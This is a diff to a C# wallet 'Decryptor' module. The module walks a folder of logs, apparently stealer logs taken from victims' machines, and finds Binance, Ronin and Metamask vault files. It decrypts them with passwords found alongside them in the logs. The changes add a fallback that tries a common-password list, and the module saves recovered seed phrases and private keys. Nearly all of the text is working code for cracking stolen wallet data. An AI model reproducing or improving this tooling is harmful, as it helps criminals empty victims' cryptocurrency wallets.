@@ -12,17 +12,20 @@ public class Decryptor
 {
     public static Structures.Types GetVaultType(string path)
     {
+        var Settings = new Utils.IniFile("Settings.ini");
+        string? rootPath = Settings.Read("Main", "LastPath");
         string? pathName = Path.GetDirectoryName(path);
 
-        if (pathName is not null)
+        if (pathName is not null && pathName != rootPath)
         {
+            string? subPath = Path.GetDirectoryName(path);
+
             Structures.Types type = pathName.ToLower() switch
             {
-                string s when s.Length < 2 => Structures.Types.Unknown,
                 string s when s.Contains("binance") => Structures.Types.Binance,
                 string s when s.Contains("ronin") => Structures.Types.Ronin,
                 string s when s.Contains("metamask") => Structures.Types.Metamask,
-                _ => Structures.Types.Unknown,
+                _ => subPath is null ? Structures.Types.Unknown : GetVaultType(subPath),
             };
 
             return type;
@@ -241,31 +244,31 @@ public class Decryptor
         return CryptoFiles;
     }
 
-    public static List<Structures.Vault.Secret> Call(string LogsPath, string ResultsPath, string RecordPath)
+    public static List<Structures.Vault.Secret> Call(string LogsPath, string RecordPath)
     {
-        Console.SetCursorPosition(0, 0);
-        Console.Clear();
-        Program.ShowLogo();
+        Utils.ClearAndShow();
 
-        string RecordType = "Decryptor";
         var Secrets = new List<Structures.Vault.Secret>();
         var Settings = new Utils.IniFile("Settings.ini");
-        string? Threads = Settings.Read("Main", "Threads");
+        string? Threads = Settings.Read("Decryptor", "Threads");
         bool SimplifiedView = Settings.Read("Output", "SimplifiedView") == "True";
+        List<string> CommonPasswords = Utils.GetCommonPasswords();
 
-        string Output = $" {"# MAIN MENU > LAUNCH".Pastel(System.Drawing.Color.OrangeRed)}\n\n {"Decryptor is a module for decrypting cryptocurrency wallets ".Pastel(ConsoleColor.Gray)}\n";
+        string Output = $" {"DECRYPTOR LAUNCHED".Pastel(System.Drawing.Color.OrangeRed)}\n {"Decryptor is a module for decrypting cryptocurrency wallets".Pastel(ConsoleColor.Gray)}\n";
         Console.WriteLine(Output);
 
         if (Threads is null || Threads == "")
         {
             Console.WriteLine(" ! Since the threads have not been configured, the default value will be \"1\"");
         }
+
         Console.WriteLine(" # Collecting vault files from paths was started, please be patient...");
         var CryptoFiles = FindVaultFiles(LogsPath);
 
         if (CryptoFiles is not null)
         {
             Console.WriteLine(" # Collecting is done! Processing...\n");
+            int CryptoFilesCount = CryptoFiles.Count;
             var Partitions = Partitioner.Create(CryptoFiles).GetPartitions(Threads is null || Threads == "" ? 1 : int.Parse(Threads));
             var Tasks = new List<Task>();
 
@@ -279,20 +282,23 @@ public class Decryptor
                         {
                             var File = Partition.Current;
                             var Passwords = Utils.FindPasswords(LogsPath, Path.GetDirectoryName(File));
-                            if (Passwords is not null)
+                            Passwords ??= CommonPasswords;
+                            var Secret = Decrypt(File, Passwords, SimplifiedView);
+
+                            if (Secret is null)
                             {
-                                var Secret = Decrypt(File, Passwords, SimplifiedView);
+                                Passwords = CommonPasswords;
+                                Secret = Decrypt(File, Passwords, SimplifiedView);
+                            }
 
-                                if (Secret is not null)
+                            if (Secret is not null)
+                            {
+                                if (Secret.Value.Mnemonics.Count != 0 || Secret.Value.PrivateKeys.Count != 0)
                                 {
-                                    if (Secret.Value.Mnemonics.Count != 0 || Secret.Value.PrivateKeys.Count != 0)
-                                    {
-                                        Secrets.Add(Secret.Value);
-                                        string RecordFullPath = $"{RecordPath}/{RecordType}";
-                                        new List<string>() { ResultsPath, RecordPath, RecordFullPath }.ForEach(el => Utils.TryCreateDirectory(el));
+                                    Secrets.Add(Secret.Value);
+                                    string RecordFullPath = $"{RecordPath}/Decryptor";
 
-                                        Recorders.Universal.Record(RecordFullPath, Secret.Value);
-                                    }
+                                    Recorders.Universal.Record(RecordFullPath, Secret.Value);
                                 }
                             }
                         }
@@ -325,9 +331,6 @@ public class Decryptor
             }
         }
 
-        Console.WriteLine(" # Process ended. Press any key to return to main menu");
-        Console.ReadKey(true);
-        Menu.Main.Show();
         return Secrets;
     }
 }
